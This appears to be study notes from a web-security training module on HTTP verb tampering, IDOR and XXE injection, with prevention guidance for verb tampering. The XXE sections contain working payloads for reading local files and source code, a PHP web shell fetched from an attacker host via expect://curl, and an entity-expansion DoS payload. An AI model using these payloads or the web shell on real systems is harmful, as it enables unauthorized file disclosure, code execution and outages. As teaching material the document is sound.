#### HTTP Verb Tampering

The first web attack discussed in this module is [HTTP Verb Tampering](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering). An HTTP Verb Tampering attack exploits web servers that accept many HTTP verbs and methods. This can be exploited by sending malicious requests using unexpected methods, which may lead to bypassing the web application's authorization mechanism or even bypassing its security controls against other web attacks. HTTP Verb Tampering attacks are one of many other HTTP attacks that can be used to exploit web server configurations by sending malicious HTTP requests.

#### Insecure Direct Object References (IDOR)

The second attack discussed in this module is [Insecure Direct Object References (IDOR)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References). IDOR is among the most common web vulnerabilities and can lead to accessing data that should not be accessible by attackers. What makes this attack very common is essentially the lack of a solid access control system on the back-end. As web applications store users' files and information, they may use sequential numbers or user IDs to identify each item. Suppose the web application lacks a robust access control mechanism and exposes direct references to files and resources. In that case, we may access other users' files and information by simply guessing or calculating their file IDs.

#### XML External Entity (XXE) Injection

The third and final web attack we will discuss is [XML External Entity (XXE) Injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_\(XXE\)_Processing). Many web applications process XML data as part of their functionality. Suppose a web application utilizes outdated XML libraries to parse and process XML input data from the front-end user. In that case, it may be possible to send malicious XML data to disclose local files stored on the back-end server. These files may be configuration files that may contain sensitive information like passwords or even the source code of the web application, which would enable us to perform a Whitebox Penetration Test on the web application to identify more vulnerabilities. XXE attacks can even be leveraged to steal the hosting server's credentials, which would compromise the entire server and allow for remote code execution.


# Verb Tampering Prevention

---

After seeing a few ways to exploit Verb Tampering vulnerabilities, let's see how we can protect ourselves against these types of attacks by preventing Verb Tampering. Insecure configurations and insecure coding are what usually introduce Verb Tampering vulnerabilities. In this section, we will look at samples of vulnerable code and configurations and discuss how we can patch them.

---

## Insecure Configuration

HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including `Apache`, `Tomcat`, and `ASP.NET`. The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected.

The following is an example of a vulnerable configuration for an Apache web server, which is located in the site configuration file (e.g. `000-default.conf`), or in a `.htaccess` web page configuration file:

Code: xml

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

As we can see, this configuration is setting the authorization configurations for the `admin` web directory. However, as the `<Limit GET>` keyword is being used, the `Require valid-user` setting will only apply to `GET` requests, leaving the page accessible through `POST` requests. Even if both `GET` and `POST` were specified, this would leave the page accessible through other methods, like `HEAD` or `OPTIONS`.

The following example shows the same vulnerability for a `Tomcat` web server configuration, which can be found in the `web.xml` file for a certain Java web application:

Code: xml

```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

We can see that the authorization is being limited only to the `GET` method with `http-method`, which leaves the page accessible through other HTTP methods.

Finally, the following is an example for an `ASP.NET` configuration found in the `web.config` file of a web application:

Code: xml

```xml
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```

Once again, the `allow` and `deny` scope is limited to the `GET` method, which leaves the web application accessible through other HTTP methods.

The above examples show that it is not secure to limit the authorization configuration to a specific HTTP verb. This is why we should always avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs and methods.

If we want to specify a single method, we can use safe keywords, like `LimitExcept` in Apache, `http-method-omission` in Tomcat, and `add`/`remove` in ASP.NET, which cover all verbs except the specified ones.

Finally, to avoid similar attacks, we should generally `consider disabling/denying all HEAD requests` unless specifically required by the web application.

---

## Insecure Coding

While identifying and patching insecure web server configurations is relatively easy, doing the same for insecure code is much more challenging. This is because to identify this vulnerability in the code, we need to find inconsistencies in the use of HTTP parameters across functions, as in some instances, this may lead to unprotected functionalities and filters.

Let's consider the following `PHP` code from our `File Manager` exercise:

Code: php

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

If we were only considering Command Injection vulnerabilities, we would say that this is securely coded. The `preg_match` function properly looks for unwanted special characters and does not allow the input to go into the command if any special characters are found. However, the fatal error made in this case is not due to Command Injections but due to the `inconsistent use of HTTP methods`.

We see that the `preg_match` filter only checks for special characters in `POST` parameters with `$_POST['filename']`. However, the final `system` command uses the `$_REQUEST['filename']` variable, which covers both `GET` and `POST` parameters. So, in the previous section, when we were sending our malicious input through a `GET` request, it did not get stopped by the `preg_match` function, as the `POST` parameters were empty and hence did not contain any special characters. Once we reach the `system` function, however, it used any parameters found in the request, and our `GET` parameters were used in the command, eventually leading to Command Injection.

This basic example shows us how minor inconsistencies in the use of HTTP methods can lead to critical vulnerabilities. In a production web application, these types of vulnerabilities will not be as obvious. They would probably be spread across the web application and will not be on two consecutive lines like we have here. Instead, the web application will likely have a special function for checking for injections and a different function for creating files. This separation of code makes it difficult to catch these sorts of inconsistencies, and hence they may survive to production.

To avoid HTTP Verb Tampering vulnerabilities in our code, `we must be consistent with our use of HTTP methods` and ensure that the same method is always used for any specific functionality across the web application. It is always advised to `expand the scope of testing in security filters` by testing all request parameters. This can be done with the following functions and variables:

|Language|Function|
|---|---|
|PHP|`$_REQUEST['param']`|
|Java|`request.getParameter('param')`|
|C#|`Request['param']`|

If our scope in security-related functions covers all methods, we should avoid such vulnerabilities or filter bypasses.

# Identifying IDORs (Important)

## URL Parameters & APIs

The very first step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. `?uid=1` or `?filename=file_1.pdf`). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (`?uid=2`) or (`?filename=file_2.pdf`). We can also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.

## AJAX Calls

We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.

For example, if we did not have an admin account, only the user-level functions would be used, while the admin functions would be disabled. However, we may still be able to find the admin functions if we look into the front-end JavaScript code and may be able to identify AJAX calls to specific end-points or APIs that contain direct object references. If we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities.

This is not unique to admin functions, of course, but can also be any functions or calls that may not be found through monitoring HTTP requests. The following example shows a basic example of an AJAX call:

Code: javascript

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end code if we have access to it (e.g., open-source web applications).

## Understand Hashing/Encoding

Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end.

Suppose the reference was encoded with a common encoder (e.g. `base64`). In that case, we could decode it and view the plaintext of the object reference, change its value, and then encode it again to access other data. For example, if we see a reference like (`?filename=ZmlsZV8xMjMucGRm`), we can immediately guess that the file name is `base64` encoded (from its character set), which we can decode to get the original object reference of (`file_123.pdf`). Then, we can try encoding a different object reference (e.g. `file_124.pdf`) and try accessing it with the encoded object reference (`?filename=ZmlsZV8xMjQucGRm`), which may reveal an IDOR vulnerability if we were able to retrieve any data.

On the other hand, the object reference may be hashed, like (`download.php?filename=c81e728d9d4c2f636f067f89cc14862c`). At a first glance, we may think that this is a secure object reference, as it is not using any clear text or easy encoding. However, if we look at the source code, we may see what is being hashed before the API call is made:

Code: javascript

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

In this case, we can see that code uses the `filename` and hashing it with `CryptoJS.MD5`, making it easy for us to calculate the `filename` for other potential files. Otherwise, we may manually try to identify the hashing algorithm being used (e.g., with hash identifier tools) and then hash the filename to see if it matches the used hash. Once we can calculate hashes for other files, we may try downloading them, which may reveal an IDOR vulnerability if we can download any files that do not belong to us.

## Compare User Roles

If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.

For example, if we had access to two different users, one of which can view their salary after making the following API call:

Code: json

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as `User1`. However, with these details at hand, we can try repeating the same API call while logged in as `User2` to see if the web application returns anything. Such cases may work if the web application only requires a valid logged-in session to make the API call but has no access control on the back-end to compare the caller's session with the data being called.

If this is the case, and we can calculate the API parameters for other users, this would be an IDOR vulnerability. Even if we could not calculate the API parameters for other users, we would still have identified a vulnerability in the back-end access control system and may start looking for other object references to exploit.


## Bypassing Encoded References

In IDORs, always check for the Requests and for the encoded values and try to get the feasible data out from it and then use that feasible data to gather more information by using IDOR vulnerability.


## XXE - XML External Entity (XXE) Injection

XML documents are formed of element trees, where each element is essentially denoted by a `tag`, and the first element is called the `root element`, while other elements are `child elements`.

![[Pasted image 20250530115537.png]]

## XML DTD

`XML Document Type Definition (DTD)` allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:

Code: xml

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

## XML Entities

We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the `ENTITY` keyword, which is followed by the entity name and its value, as follows:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once we define an entity, it can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can `reference External XML Entities` with the `SYSTEM` keyword, which is followed by the external entity's path, as follows:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```


## Reading Sensitive Files

Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the `SYSTEM` keyword and define the external reference path after it, as we have learned in the previous section:

Code: xml

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
Let us now send the modified request and see whether the value of our external XML entity gets set to the file we reference:

![HTTP POST request to /submitDetails.php with XML data including 'name', 'tel', 'email', and 'message' fields. Response: HTTP/1.1 200 OK, displaying contents of /etc/passwd](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)

We see that we did indeed get the content of the `/etc/passwd` file, `meaning that we have successfully exploited the XXE vulnerability to read local files`. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant us access to the back-end server. We can refer to the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/course/preview/file-inclusion) module to see what attacks can be carried out through local file disclosure.

## Reading Source Code

Another benefit of local file disclosure is the ability to obtain the source code of the web application. This would allow us to perform a `Whitebox Penetration Test` to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.

So, let us see if we can use the same attack to read the source code of the `index.php` file, as follows:

![HTTP POST request to /submitDetails.php with XML data including 'name', 'tel', 'email', and 'message' fields. Response: HTTP/1.1 200 OK, message 'Check your email for further instructions.'](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)

As we can see, this did not work, as we did not get any content. This happened because `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. If a file contains some of XML's special characters (e.g. `<`/`>`/`&`), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.

Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using `file://` as our reference, we will use PHP's `php://filter/` wrapper. With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:

Code: xml

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

With that, we can send our request, and we will get the base64 encoded string of the `index.php` file:

![HTTP POST request to /submitDetails.php with XML data including 'name', 'tel', 'email', and 'message' fields. Response: HTTP/1.1 200 OK, message 'Check your email for further instructions.' Base64 encoded data is present in the response.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)

We can select the base64 string, click on Burp's Inspector tab (on the right pane), and it will show us the decoded file. For more on PHP filters, you can refer to the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/module/details/23) module.

`This trick only works with PHP web applications.` 

## Remote Code Execution with XXE

In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the `PHP://expect` filter, though this requires the PHP `expect` module to be installed and enabled.

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:

  Local File Disclosure

```shell-session
ShibuShivansh@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
ShibuShivansh@htb[/htb]$ sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:

Code: xml

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

Once we send the request, we should receive a request on our machine for the `shell.php` file, after which we can interact with the web shell on the remote server for code execution.

**Note:** The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.

## XML DOS
One common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:

Code: xml

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

This payload defines the `a0` entity as `DOS`, references it in `a1` multiple times, references `a1` in `a2`, and so on until the back-end server's memory runs out due to the self-reference loops. However, `this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference`. Try it against this exercise, and see if it works.
